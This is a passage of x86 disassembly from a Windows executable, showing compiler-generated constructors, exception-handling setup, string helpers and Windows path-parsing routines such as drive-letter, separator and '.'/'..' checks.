  401625:	c2 04 00             	ret    $0x4
  401628:	cc                   	int3
  401629:	cc                   	int3
  40162a:	cc                   	int3
  40162b:	cc                   	int3
  40162c:	cc                   	int3
  40162d:	cc                   	int3
  40162e:	cc                   	int3
  40162f:	cc                   	int3
  401630:	55                   	push   %ebp
  401631:	8b ec                	mov    %esp,%ebp
  401633:	56                   	push   %esi
  401634:	8b 75 08             	mov    0x8(%ebp),%esi
  401637:	0f 57 c0             	xorps  %xmm0,%xmm0
  40163a:	57                   	push   %edi
  40163b:	8b f9                	mov    %ecx,%edi
  40163d:	8d 47 04             	lea    0x4(%edi),%eax
  401640:	50                   	push   %eax
  401641:	c7 07 64 93 40 00    	movl   $0x409364,(%edi)
  401647:	66 0f d6 00          	movq   %xmm0,(%eax)
  40164b:	8d 46 04             	lea    0x4(%esi),%eax
  40164e:	50                   	push   %eax
  40164f:	ff 15 24 91 40 00    	call   *0x409124
  401655:	83 c4 08             	add    $0x8,%esp
  401658:	c7 07 ac 95 40 00    	movl   $0x4095ac,(%edi)
  40165e:	8b 46 0c             	mov    0xc(%esi),%eax
  401661:	8b 4e 10             	mov    0x10(%esi),%ecx
  401664:	89 47 0c             	mov    %eax,0xc(%edi)
  401667:	8b c7                	mov    %edi,%eax
  401669:	89 4f 10             	mov    %ecx,0x10(%edi)
  40166c:	5f                   	pop    %edi
  40166d:	5e                   	pop    %esi
  40166e:	5d                   	pop    %ebp
  40166f:	c2 04 00             	ret    $0x4
  401672:	cc                   	int3
  401673:	cc                   	int3
  401674:	cc                   	int3
  401675:	cc                   	int3
  401676:	cc                   	int3
  401677:	cc                   	int3
  401678:	cc                   	int3
  401679:	cc                   	int3
  40167a:	cc                   	int3
  40167b:	cc                   	int3
  40167c:	cc                   	int3
  40167d:	cc                   	int3
  40167e:	cc                   	int3
  40167f:	cc                   	int3
  401680:	ff 31                	push   (%ecx)
  401682:	e8 0a 4f 00 00       	call   0x406591
  401687:	c3                   	ret
  401688:	cc                   	int3
  401689:	cc                   	int3
  40168a:	cc                   	int3
  40168b:	cc                   	int3
  40168c:	cc                   	int3
  40168d:	cc                   	int3
  40168e:	cc                   	int3
  40168f:	cc                   	int3
  401690:	b8 d4 93 40 00       	mov    $0x4093d4,%eax
  401695:	c3                   	ret
  401696:	cc                   	int3
  401697:	cc                   	int3
  401698:	cc                   	int3
  401699:	cc                   	int3
  40169a:	cc                   	int3
  40169b:	cc                   	int3
  40169c:	cc                   	int3
  40169d:	cc                   	int3
  40169e:	cc                   	int3
  40169f:	cc                   	int3
  4016a0:	55                   	push   %ebp
  4016a1:	8b ec                	mov    %esp,%ebp
  4016a3:	6a ff                	push   $0xffffffff
  4016a5:	68 40 7a 40 00       	push   $0x407a40
  4016aa:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4016b0:	50                   	push   %eax
  4016b1:	83 ec 08             	sub    $0x8,%esp
  4016b4:	56                   	push   %esi
  4016b5:	57                   	push   %edi
  4016b6:	a1 04 c0 40 00       	mov    0x40c004,%eax
  4016bb:	33 c5                	xor    %ebp,%eax
  4016bd:	50                   	push   %eax
  4016be:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4016c1:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4016c7:	8b 45 0c             	mov    0xc(%ebp),%eax
  4016ca:	8b 75 08             	mov    0x8(%ebp),%esi
  4016cd:	50                   	push   %eax
  4016ce:	89 75 f0             	mov    %esi,-0x10(%ebp)
  4016d1:	ff 15 e4 90 40 00    	call   *0x4090e4
  4016d7:	83 c4 04             	add    $0x4,%esp
  4016da:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  4016e0:	8b d0                	mov    %eax,%edx
  4016e2:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  4016e9:	c7 46 14 00 00 00 00 	movl   $0x0,0x14(%esi)
  4016f0:	8b ca                	mov    %edx,%ecx
  4016f2:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  4016f9:	c7 46 14 0f 00 00 00 	movl   $0xf,0x14(%esi)
  401700:	c6 06 00             	movb   $0x0,(%esi)
  401703:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40170a:	8d 79 01             	lea    0x1(%ecx),%edi
  40170d:	0f 1f 00             	nopl   (%eax)
  401710:	8a 01                	mov    (%ecx),%al
  401712:	41                   	inc    %ecx
  401713:	84 c0                	test   %al,%al
  401715:	75 f9                	jne    0x401710
  401717:	2b cf                	sub    %edi,%ecx
  401719:	51                   	push   %ecx
  40171a:	52                   	push   %edx
  40171b:	8b ce                	mov    %esi,%ecx
  40171d:	e8 de 30 00 00       	call   0x404800
  401722:	8b c6                	mov    %esi,%eax
  401724:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401727:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40172e:	59                   	pop    %ecx
  40172f:	5f                   	pop    %edi
  401730:	5e                   	pop    %esi
  401731:	8b e5                	mov    %ebp,%esp
  401733:	5d                   	pop    %ebp
  401734:	c2 08 00             	ret    $0x8
  401737:	cc                   	int3
  401738:	cc                   	int3
  401739:	cc                   	int3
  40173a:	cc                   	int3
  40173b:	cc                   	int3
  40173c:	cc                   	int3
  40173d:	cc                   	int3
  40173e:	cc                   	int3
  40173f:	cc                   	int3
  401740:	55                   	push   %ebp
  401741:	8b ec                	mov    %esp,%ebp
  401743:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  401747:	56                   	push   %esi
  401748:	8b f1                	mov    %ecx,%esi
  40174a:	74 0b                	je     0x401757
  40174c:	6a 08                	push   $0x8
  40174e:	56                   	push   %esi
  40174f:	e8 68 53 00 00       	call   0x406abc
  401754:	83 c4 08             	add    $0x8,%esp
  401757:	8b c6                	mov    %esi,%eax
  401759:	5e                   	pop    %esi
  40175a:	5d                   	pop    %ebp
  40175b:	c2 04 00             	ret    $0x4
  40175e:	cc                   	int3
  40175f:	cc                   	int3
  401760:	b8 dc 93 40 00       	mov    $0x4093dc,%eax
  401765:	c3                   	ret
  401766:	cc                   	int3
  401767:	cc                   	int3
  401768:	cc                   	int3
  401769:	cc                   	int3
  40176a:	cc                   	int3
  40176b:	cc                   	int3
  40176c:	cc                   	int3
  40176d:	cc                   	int3
  40176e:	cc                   	int3
  40176f:	cc                   	int3
  401770:	55                   	push   %ebp
  401771:	8b ec                	mov    %esp,%ebp
  401773:	6a ff                	push   $0xffffffff
  401775:	68 6d 7a 40 00       	push   $0x407a6d
  40177a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401780:	50                   	push   %eax
  401781:	83 ec 10             	sub    $0x10,%esp
  401784:	a1 04 c0 40 00       	mov    0x40c004,%eax
  401789:	33 c5                	xor    %ebp,%eax
  40178b:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40178e:	56                   	push   %esi
  40178f:	50                   	push   %eax
  401790:	8d 45 f4             	lea    -0xc(%ebp),%eax
  401793:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401799:	8b 45 0c             	mov    0xc(%ebp),%eax
  40179c:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  40179f:	8b 75 08             	mov    0x8(%ebp),%esi
  4017a2:	51                   	push   %ecx
  4017a3:	89 75 ec             	mov    %esi,-0x14(%ebp)
  4017a6:	50                   	push   %eax
  4017a7:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  4017ae:	e8 b5 4d 00 00       	call   0x406568
  4017b3:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4017b6:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4017bd:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  4017c3:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  4017ca:	c7 46 14 00 00 00 00 	movl   $0x0,0x14(%esi)
  4017d1:	85 c0                	test   %eax,%eax
  4017d3:	75 0c                	jne    0x4017e1
  4017d5:	6a 0d                	push   $0xd
  4017d7:	88 45 fc             	mov    %al,-0x4(%ebp)
  4017da:	68 8c 95 40 00       	push   $0x40958c
  4017df:	eb 08                	jmp    0x4017e9
  4017e1:	50                   	push   %eax
  4017e2:	c6 45 fc 00          	movb   $0x0,-0x4(%ebp)
  4017e6:	ff 75 e8             	push   -0x18(%ebp)
  4017e9:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  4017f0:	8b ce                	mov    %esi,%ecx
  4017f2:	c7 46 14 0f 00 00 00 	movl   $0xf,0x14(%esi)
  4017f9:	c6 06 00             	movb   $0x0,(%esi)
  4017fc:	e8 ff 2f 00 00       	call   0x404800
  401801:	ff 75 e8             	push   -0x18(%ebp)
  401804:	e8 88 4d 00 00       	call   0x406591
  401809:	8b c6                	mov    %esi,%eax
  40180b:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40180e:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401815:	59                   	pop    %ecx
  401816:	5e                   	pop    %esi
  401817:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40181a:	33 cd                	xor    %ebp,%ecx
  40181c:	e8 58 52 00 00       	call   0x406a79
  401821:	8b e5                	mov    %ebp,%esp
  401823:	5d                   	pop    %ebp
  401824:	c2 08 00             	ret    $0x8
  401827:	cc                   	int3
  401828:	cc                   	int3
  401829:	cc                   	int3
  40182a:	cc                   	int3
  40182b:	cc                   	int3
  40182c:	cc                   	int3
  40182d:	cc                   	int3
  40182e:	cc                   	int3
  40182f:	cc                   	int3
  401830:	55                   	push   %ebp
  401831:	8b ec                	mov    %esp,%ebp
  401833:	6a ff                	push   $0xffffffff
  401835:	68 a0 7a 40 00       	push   $0x407aa0
  40183a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401840:	50                   	push   %eax
  401841:	56                   	push   %esi
  401842:	a1 04 c0 40 00       	mov    0x40c004,%eax
  401847:	33 c5                	xor    %ebp,%eax
  401849:	50                   	push   %eax
  40184a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40184d:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401853:	8b 75 0c             	mov    0xc(%ebp),%esi
  401856:	56                   	push   %esi
  401857:	ff 15 f4 90 40 00    	call   *0x4090f4
  40185d:	8b c8                	mov    %eax,%ecx
  40185f:	83 c4 04             	add    $0x4,%esp
  401862:	8b 45 08             	mov    0x8(%ebp),%eax
  401865:	85 c9                	test   %ecx,%ecx
  401867:	75 1b                	jne    0x401884
  401869:	89 30                	mov    %esi,(%eax)
  40186b:	c7 40 04 20 c0 40 00 	movl   $0x40c020,0x4(%eax)
  401872:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401875:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40187c:	59                   	pop    %ecx
  40187d:	5e                   	pop    %esi
  40187e:	8b e5                	mov    %ebp,%esp
  401880:	5d                   	pop    %ebp
  401881:	c2 08 00             	ret    $0x8
  401884:	89 08                	mov    %ecx,(%eax)
  401886:	c7 40 04 18 c0 40 00 	movl   $0x40c018,0x4(%eax)
  40188d:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401890:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401897:	59                   	pop    %ecx
  401898:	5e                   	pop    %esi
  401899:	8b e5                	mov    %ebp,%esp
  40189b:	5d                   	pop    %ebp
  40189c:	c2 08 00             	ret    $0x8
  40189f:	cc                   	int3
  4018a0:	cc                   	int3
  4018a1:	cc                   	int3
  4018a2:	cc                   	int3
  4018a3:	cc                   	int3
  4018a4:	cc                   	int3
  4018a5:	cc                   	int3
  4018a6:	cc                   	int3
  4018a7:	cc                   	int3
  4018a8:	cc                   	int3
  4018a9:	cc                   	int3
  4018aa:	cc                   	int3
  4018ab:	cc                   	int3
  4018ac:	cc                   	int3
  4018ad:	cc                   	int3
  4018ae:	cc                   	int3
  4018af:	cc                   	int3
  4018b0:	0f 57 c0             	xorps  %xmm0,%xmm0
  4018b3:	8b c1                	mov    %ecx,%eax
  4018b5:	66 0f d6 41 04       	movq   %xmm0,0x4(%ecx)
  4018ba:	c7 41 04 e4 93 40 00 	movl   $0x4093e4,0x4(%ecx)
  4018c1:	c7 01 84 95 40 00    	movl   $0x409584,(%ecx)
  4018c7:	c3                   	ret
  4018c8:	cc                   	int3
  4018c9:	cc                   	int3
  4018ca:	cc                   	int3
  4018cb:	cc                   	int3
  4018cc:	cc                   	int3
  4018cd:	cc                   	int3
  4018ce:	cc                   	int3
  4018cf:	cc                   	int3
  4018d0:	55                   	push   %ebp
  4018d1:	8b ec                	mov    %esp,%ebp
  4018d3:	83 ec 0c             	sub    $0xc,%esp
  4018d6:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4018d9:	e8 d2 ff ff ff       	call   0x4018b0
  4018de:	68 34 aa 40 00       	push   $0x40aa34
  4018e3:	8b c1                	mov    %ecx,%eax
  4018e5:	50                   	push   %eax
  4018e6:	e8 a5 5d 00 00       	call   0x407690
  4018eb:	cc                   	int3
  4018ec:	cc                   	int3
  4018ed:	cc                   	int3
  4018ee:	cc                   	int3
  4018ef:	cc                   	int3
  4018f0:	55                   	push   %ebp
  4018f1:	8b ec                	mov    %esp,%ebp
  4018f3:	56                   	push   %esi
  4018f4:	8b f1                	mov    %ecx,%esi
  4018f6:	0f 57 c0             	xorps  %xmm0,%xmm0
  4018f9:	8d 46 04             	lea    0x4(%esi),%eax
  4018fc:	50                   	push   %eax
  4018fd:	c7 06 64 93 40 00    	movl   $0x409364,(%esi)
  401903:	66 0f d6 00          	movq   %xmm0,(%eax)
  401907:	8b 45 08             	mov    0x8(%ebp),%eax
  40190a:	83 c0 04             	add    $0x4,%eax
  40190d:	50                   	push   %eax
  40190e:	ff 15 24 91 40 00    	call   *0x409124
  401914:	83 c4 08             	add    $0x8,%esp
  401917:	c7 06 84 95 40 00    	movl   $0x409584,(%esi)
  40191d:	8b c6                	mov    %esi,%eax
  40191f:	5e                   	pop    %esi
  401920:	5d                   	pop    %ebp
  401921:	c2 04 00             	ret    $0x4
  401924:	cc                   	int3
  401925:	cc                   	int3
  401926:	cc                   	int3
  401927:	cc                   	int3
  401928:	cc                   	int3
  401929:	cc                   	int3
  40192a:	cc                   	int3
  40192b:	cc                   	int3
  40192c:	cc                   	int3
  40192d:	cc                   	int3
  40192e:	cc                   	int3
  40192f:	cc                   	int3
  401930:	33 c0                	xor    %eax,%eax
  401932:	c2 04 00             	ret    $0x4
  401935:	cc                   	int3
  401936:	cc                   	int3
  401937:	cc                   	int3
  401938:	cc                   	int3
  401939:	cc                   	int3
  40193a:	cc                   	int3
  40193b:	cc                   	int3
  40193c:	cc                   	int3
  40193d:	cc                   	int3
  40193e:	cc                   	int3
  40193f:	cc                   	int3
  401940:	8b 49 04             	mov    0x4(%ecx),%ecx
  401943:	85 c9                	test   %ecx,%ecx
  401945:	74 11                	je     0x401958
  401947:	8b 01                	mov    (%ecx),%eax
  401949:	ff 50 08             	call   *0x8(%eax)
  40194c:	85 c0                	test   %eax,%eax
  40194e:	74 08                	je     0x401958
  401950:	8b 10                	mov    (%eax),%edx
  401952:	8b c8                	mov    %eax,%ecx
  401954:	6a 01                	push   $0x1
  401956:	ff 12                	call   *(%edx)
  401958:	c3                   	ret
  401959:	cc                   	int3
  40195a:	cc                   	int3
  40195b:	cc                   	int3
  40195c:	cc                   	int3
  40195d:	cc                   	int3
  40195e:	cc                   	int3
  40195f:	cc                   	int3
  401960:	89 11                	mov    %edx,(%ecx)
  401962:	8b c1                	mov    %ecx,%eax
  401964:	c7 41 04 20 c0 40 00 	movl   $0x40c020,0x4(%ecx)
  40196b:	c3                   	ret
  40196c:	cc                   	int3
  40196d:	cc                   	int3
  40196e:	cc                   	int3
  40196f:	cc                   	int3
  401970:	55                   	push   %ebp
  401971:	8b ec                	mov    %esp,%ebp
  401973:	83 e4 f8             	and    $0xfffffff8,%esp
  401976:	83 ec 20             	sub    $0x20,%esp
  401979:	8b d1                	mov    %ecx,%edx
  40197b:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  40197f:	e8 dc ff ff ff       	call   0x401960
  401984:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  401988:	ff 70 04             	push   0x4(%eax)
  40198b:	ff 30                	push   (%eax)
  40198d:	e8 1e fb ff ff       	call   0x4014b0
  401992:	68 88 a9 40 00       	push   $0x40a988
  401997:	8d 44 24 10          	lea    0x10(%esp),%eax
  40199b:	50                   	push   %eax
  40199c:	e8 ef 5c 00 00       	call   0x407690
  4019a1:	cc                   	int3
  4019a2:	cc                   	int3
  4019a3:	cc                   	int3
  4019a4:	cc                   	int3
  4019a5:	cc                   	int3
  4019a6:	cc                   	int3
  4019a7:	cc                   	int3
  4019a8:	cc                   	int3
  4019a9:	cc                   	int3
  4019aa:	cc                   	int3
  4019ab:	cc                   	int3
  4019ac:	cc                   	int3
  4019ad:	cc                   	int3
  4019ae:	cc                   	int3
  4019af:	cc                   	int3
  4019b0:	56                   	push   %esi
  4019b1:	8b f2                	mov    %edx,%esi
  4019b3:	2b f1                	sub    %ecx,%esi
  4019b5:	d1 fe                	sar    $1,%esi
  4019b7:	57                   	push   %edi
  4019b8:	83 fe 02             	cmp    $0x2,%esi
  4019bb:	0f 8c bc 00 00 00    	jl     0x401a7d
  4019c1:	8b 01                	mov    (%ecx),%eax
  4019c3:	0f b7 f8             	movzwl %ax,%edi
  4019c6:	83 e0 df             	and    $0xffffffdf,%eax
  4019c9:	2d 41 00 3a 00       	sub    $0x3a0041,%eax
  4019ce:	83 f8 1a             	cmp    $0x1a,%eax
  4019d1:	73 06                	jae    0x4019d9
  4019d3:	5f                   	pop    %edi
  4019d4:	8d 41 04             	lea    0x4(%ecx),%eax
  4019d7:	5e                   	pop    %esi
  4019d8:	c3                   	ret
  4019d9:	8b c7                	mov    %edi,%eax
  4019db:	83 f8 5c             	cmp    $0x5c,%eax
  4019de:	74 09                	je     0x4019e9
  4019e0:	83 f8 2f             	cmp    $0x2f,%eax
  4019e3:	0f 85 94 00 00 00    	jne    0x401a7d
  4019e9:	83 fe 04             	cmp    $0x4,%esi
  4019ec:	7c 50                	jl     0x401a3e
  4019ee:	0f b7 41 06          	movzwl 0x6(%ecx),%eax
  4019f2:	83 f8 5c             	cmp    $0x5c,%eax
  4019f5:	74 05                	je     0x4019fc
  4019f7:	83 f8 2f             	cmp    $0x2f,%eax
  4019fa:	75 47                	jne    0x401a43
  4019fc:	83 fe 04             	cmp    $0x4,%esi
  4019ff:	74 0e                	je     0x401a0f
  401a01:	0f b7 41 08          	movzwl 0x8(%ecx),%eax
  401a05:	83 f8 5c             	cmp    $0x5c,%eax
  401a08:	74 39                	je     0x401a43
  401a0a:	83 f8 2f             	cmp    $0x2f,%eax
  401a0d:	74 34                	je     0x401a43
  401a0f:	0f b7 71 02          	movzwl 0x2(%ecx),%esi
  401a13:	8b c6                	mov    %esi,%eax
  401a15:	83 f8 5c             	cmp    $0x5c,%eax
  401a18:	74 05                	je     0x401a1f
  401a1a:	83 f8 2f             	cmp    $0x2f,%eax
  401a1d:	75 0e                	jne    0x401a2d
  401a1f:	0f b7 41 04          	movzwl 0x4(%ecx),%eax
  401a23:	83 f8 3f             	cmp    $0x3f,%eax
  401a26:	74 10                	je     0x401a38
  401a28:	83 f8 2e             	cmp    $0x2e,%eax
  401a2b:	74 0b                	je     0x401a38
  401a2d:	83 fe 3f             	cmp    $0x3f,%esi
  401a30:	75 11                	jne    0x401a43
  401a32:	66 39 71 04          	cmp    %si,0x4(%ecx)
  401a36:	75 0b                	jne    0x401a43
  401a38:	5f                   	pop    %edi
  401a39:	8d 41 06             	lea    0x6(%ecx),%eax
  401a3c:	5e                   	pop    %esi
  401a3d:	c3                   	ret
  401a3e:	83 fe 03             	cmp    $0x3,%esi
  401a41:	7c 3a                	jl     0x401a7d
  401a43:	0f b7 41 02          	movzwl 0x2(%ecx),%eax
  401a47:	83 f8 5c             	cmp    $0x5c,%eax
  401a4a:	74 05                	je     0x401a51
  401a4c:	83 f8 2f             	cmp    $0x2f,%eax
  401a4f:	75 2c                	jne    0x401a7d
  401a51:	0f b7 41 04          	movzwl 0x4(%ecx),%eax
  401a55:	83 f8 5c             	cmp    $0x5c,%eax
  401a58:	74 23                	je     0x401a7d
  401a5a:	83 f8 2f             	cmp    $0x2f,%eax
  401a5d:	74 1e                	je     0x401a7d
  401a5f:	8d 41 06             	lea    0x6(%ecx),%eax
  401a62:	3b c2                	cmp    %edx,%eax
  401a64:	74 19                	je     0x401a7f
  401a66:	0f b7 08             	movzwl (%eax),%ecx
  401a69:	83 f9 5c             	cmp    $0x5c,%ecx
  401a6c:	74 11                	je     0x401a7f
  401a6e:	83 f9 2f             	cmp    $0x2f,%ecx
  401a71:	74 0c                	je     0x401a7f
  401a73:	83 c0 02             	add    $0x2,%eax
  401a76:	3b c2                	cmp    %edx,%eax
  401a78:	75 ec                	jne    0x401a66
  401a7a:	5f                   	pop    %edi
  401a7b:	5e                   	pop    %esi
  401a7c:	c3                   	ret
  401a7d:	8b c1                	mov    %ecx,%eax
  401a7f:	5f                   	pop    %edi
  401a80:	5e                   	pop    %esi
  401a81:	c3                   	ret
  401a82:	cc                   	int3
  401a83:	cc                   	int3
  401a84:	cc                   	int3
  401a85:	cc                   	int3
  401a86:	cc                   	int3
  401a87:	cc                   	int3
  401a88:	cc                   	int3
  401a89:	cc                   	int3
  401a8a:	cc                   	int3
  401a8b:	cc                   	int3
  401a8c:	cc                   	int3
  401a8d:	cc                   	int3
  401a8e:	cc                   	int3
  401a8f:	cc                   	int3
  401a90:	e8 1b ff ff ff       	call   0x4019b0
  401a95:	3b c2                	cmp    %edx,%eax
  401a97:	74 40                	je     0x401ad9
  401a99:	0f 1f 80 00 00 00 00 	nopl   0x0(%eax)
  401aa0:	0f b7 08             	movzwl (%eax),%ecx
  401aa3:	83 f9 5c             	cmp    $0x5c,%ecx
  401aa6:	74 05                	je     0x401aad
  401aa8:	83 f9 2f             	cmp    $0x2f,%ecx
  401aab:	75 07                	jne    0x401ab4
  401aad:	83 c0 02             	add    $0x2,%eax
  401ab0:	3b c2                	cmp    %edx,%eax
  401ab2:	75 ec                	jne    0x401aa0
  401ab4:	3b c2                	cmp    %edx,%eax
  401ab6:	74 21                	je     0x401ad9
  401ab8:	56                   	push   %esi
  401ab9:	0f 1f 80 00 00 00 00 	nopl   0x0(%eax)
  401ac0:	0f b7 72 fe          	movzwl -0x2(%edx),%esi
  401ac4:	83 fe 5c             	cmp    $0x5c,%esi
  401ac7:	74 0c                	je     0x401ad5
  401ac9:	83 fe 2f             	cmp    $0x2f,%esi
  401acc:	74 07                	je     0x401ad5
  401ace:	83 c2 fe             	add    $0xfffffffe,%edx
  401ad1:	3b c2                	cmp    %edx,%eax
  401ad3:	75 eb                	jne    0x401ac0
  401ad5:	8b c2                	mov    %edx,%eax
  401ad7:	5e                   	pop    %esi
  401ad8:	c3                   	ret
  401ad9:	8b c2                	mov    %edx,%eax
  401adb:	c3                   	ret
  401adc:	cc                   	int3
  401add:	cc                   	int3
  401ade:	cc                   	int3
  401adf:	cc                   	int3
  401ae0:	55                   	push   %ebp
  401ae1:	8b ec                	mov    %esp,%ebp
  401ae3:	8b 45 08             	mov    0x8(%ebp),%eax
  401ae6:	53                   	push   %ebx
  401ae7:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  401aea:	56                   	push   %esi
  401aeb:	57                   	push   %edi
  401aec:	8b f9                	mov    %ecx,%edi
  401aee:	2b d8                	sub    %eax,%ebx
  401af0:	2b d7                	sub    %edi,%edx
  401af2:	d1 fb                	sar    $1,%ebx
  401af4:	d1 fa                	sar    $1,%edx
  401af6:	3b da                	cmp    %edx,%ebx
  401af8:	89 55 0c             	mov    %edx,0xc(%ebp)
  401afb:	8b f2                	mov    %edx,%esi
  401afd:	0f 42 f3             	cmovb  %ebx,%esi
  401b00:	85 f6                	test   %esi,%esi
  401b02:	74 3d                	je     0x401b41
  401b04:	0f b7 0f             	movzwl (%edi),%ecx
  401b07:	0f b7 10             	movzwl (%eax),%edx
  401b0a:	66 3b ca             	cmp    %dx,%cx
  401b0d:	72 1d                	jb     0x401b2c
  401b0f:	2b f8                	sub    %eax,%edi
  401b11:	66 3b ca             	cmp    %dx,%cx
  401b14:	77 1e                	ja     0x401b34
  401b16:	83 fe 01             	cmp    $0x1,%esi
  401b19:	74 23                	je     0x401b3e
  401b1b:	0f b7 4c 07 02       	movzwl 0x2(%edi,%eax,1),%ecx
  401b20:	83 c0 02             	add    $0x2,%eax
  401b23:	4e                   	dec    %esi
  401b24:	0f b7 10             	movzwl (%eax),%edx
  401b27:	66 3b ca             	cmp    %dx,%cx
  401b2a:	73 e8                	jae    0x401b14
  401b2c:	5f                   	pop    %edi
  401b2d:	5e                   	pop    %esi
  401b2e:	83 c8 ff             	or     $0xffffffff,%eax
  401b31:	5b                   	pop    %ebx
  401b32:	5d                   	pop    %ebp
  401b33:	c3                   	ret
  401b34:	5f                   	pop    %edi
  401b35:	5e                   	pop    %esi
  401b36:	b8 01 00 00 00       	mov    $0x1,%eax
  401b3b:	5b                   	pop    %ebx
  401b3c:	5d                   	pop    %ebp
  401b3d:	c3                   	ret
  401b3e:	8b 55 0c             	mov    0xc(%ebp),%edx
  401b41:	3b da                	cmp    %edx,%ebx
  401b43:	77 e7                	ja     0x401b2c
  401b45:	5f                   	pop    %edi
  401b46:	1b c0                	sbb    %eax,%eax
  401b48:	5e                   	pop    %esi
  401b49:	f7 d8                	neg    %eax
  401b4b:	5b                   	pop    %ebx
  401b4c:	5d                   	pop    %ebp
  401b4d:	c3                   	ret
  401b4e:	cc                   	int3
  401b4f:	cc                   	int3
  401b50:	66 83 79 2c 2e       	cmpw   $0x2e,0x2c(%ecx)
  401b55:	75 1a                	jne    0x401b71
  401b57:	0f b7 41 2e          	movzwl 0x2e(%ecx),%eax
  401b5b:	66 85 c0             	test   %ax,%ax
  401b5e:	75 03                	jne    0x401b63
  401b60:	b0 01                	mov    $0x1,%al
  401b62:	c3                   	ret
  401b63:	83 f8 2e             	cmp    $0x2e,%eax
  401b66:	75 09                	jne    0x401b71
  401b68:	66 83 79 30 00       	cmpw   $0x0,0x30(%ecx)
  401b6d:	0f 94 c0             	sete   %al
  401b70:	c3                   	ret
  401b71:	32 c0                	xor    %al,%al
  401b73:	c3                   	ret
  401b74:	cc                   	int3
  401b75:	cc                   	int3
  401b76:	cc                   	int3
  401b77:	cc                   	int3
  401b78:	cc                   	int3
  401b79:	cc                   	int3
  401b7a:	cc                   	int3
  401b7b:	cc                   	int3
  401b7c:	cc                   	int3
  401b7d:	cc                   	int3
  401b7e:	cc                   	int3
  401b7f:	cc                   	int3
  401b80:	ff 31                	push   (%ecx)
  401b82:	e8 c5 4b 00 00       	call   0x40674c
  401b87:	c3                   	ret
  401b88:	cc                   	int3
  401b89:	cc                   	int3
  401b8a:	cc                   	int3
  401b8b:	cc                   	int3
  401b8c:	cc                   	int3
  401b8d:	cc                   	int3
  401b8e:	cc                   	int3
  401b8f:	cc                   	int3
  401b90:	55                   	push   %ebp
  401b91:	8b ec                	mov    %esp,%ebp
  401b93:	83 ec 20             	sub    $0x20,%esp
  401b96:	53                   	push   %ebx
  401b97:	56                   	push   %esi
  401b98:	57                   	push   %edi
  401b99:	8b 7d 08             	mov    0x8(%ebp),%edi
  401b9c:	8b f1                	mov    %ecx,%esi
  401b9e:	8b df                	mov    %edi,%ebx
  401ba0:	8b 57 14             	mov    0x14(%edi),%edx
  401ba3:	83 fa 08             	cmp    $0x8,%edx
  401ba6:	72 02                	jb     0x401baa
  401ba8:	8b 1f                	mov    (%edi),%ebx
  401baa:	8b 47 10             	mov    0x10(%edi),%eax
  401bad:	89 45 e0             	mov    %eax,-0x20(%ebp)
  401bb0:	03 c0                	add    %eax,%eax
  401bb2:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401bb5:	8d 0c 18             	lea    (%eax,%ebx,1),%ecx
  401bb8:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  401bbb:	8b c8                	mov    %eax,%ecx
  401bbd:	d1 f9                	sar    $1,%ecx
  401bbf:	83 f9 02             	cmp    $0x2,%ecx
  401bc2:	0f 8c ba 00 00 00    	jl     0x401c82
  401bc8:	8b 03                	mov    (%ebx),%eax
  401bca:	83 e0 df             	and    $0xffffffdf,%eax
  401bcd:	2d 41 00 3a 00       	sub    $0x3a0041,%eax
  401bd2:	83 f8 1a             	cmp    $0x1a,%eax
  401bd5:	0f 83 a7 00 00 00    	jae    0x401c82
  401bdb:	83 f9 03             	cmp    $0x3,%ecx
  401bde:	7c 16                	jl     0x401bf6
  401be0:	0f b7 43 04          	movzwl 0x4(%ebx),%eax
  401be4:	83 f8 5c             	cmp    $0x5c,%eax
  401be7:	0f 84 aa 00 00 00    	je     0x401c97
  401bed:	83 f8 2f             	cmp    $0x2f,%eax
  401bf0:	0f 84 a1 00 00 00    	je     0x401c97
  401bf6:	8b 46 14             	mov    0x14(%esi),%eax
  401bf9:	8b ce                	mov    %esi,%ecx
  401bfb:	89 75 f4             	mov    %esi,-0xc(%ebp)
  401bfe:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401c01:	83 f8 08             	cmp    $0x8,%eax
  401c04:	72 05                	jb     0x401c0b
  401c06:	8b 0e                	mov    (%esi),%ecx
  401c08:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  401c0b:	8b 46 10             	mov    0x10(%esi),%eax
  401c0e:	03 c0                	add    %eax,%eax
  401c10:	89 7d f8             	mov    %edi,-0x8(%ebp)
  401c13:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401c16:	8d 1c 08             	lea    (%eax,%ecx,1),%ebx
